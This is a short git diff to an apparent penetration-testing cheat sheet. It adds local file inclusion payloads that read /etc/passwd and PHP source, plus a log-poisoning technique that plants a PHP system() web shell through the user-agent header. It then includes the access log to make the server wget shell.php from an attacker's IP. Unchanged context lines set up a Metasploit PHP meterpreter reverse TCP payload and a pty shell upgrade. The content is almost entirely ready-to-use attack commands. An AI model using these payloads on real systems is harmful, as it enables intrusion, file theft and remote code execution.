@@ -59,7 +59,7 @@
 - `set payload php/meterpreter_reverse_tcp`
 - `set LHOST 10.0.0.1`
 - `set LPORT  9998`
-- `run``
+- `run`
 
 ###### Reverse shells
 
@@ -71,6 +71,13 @@
 - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
 ###### Web enumeration
+
+LFI
 - `http://10.0.0.1/?page=index.php`
 - `http://10.0.0.1/?page=../../../etc/passwd`
 - `http://10.0.0.1/?page=php://filter/convert.base64-encode/resource=index.php`
+
+Log injection 
+- change user agent
+- `<?php system($_GET['cmd']); ?>`
+- `http://10.0.0.1/?page=../../../var/apache2/access.log?cmd=wget%20http://IP:PORT/shell.php`
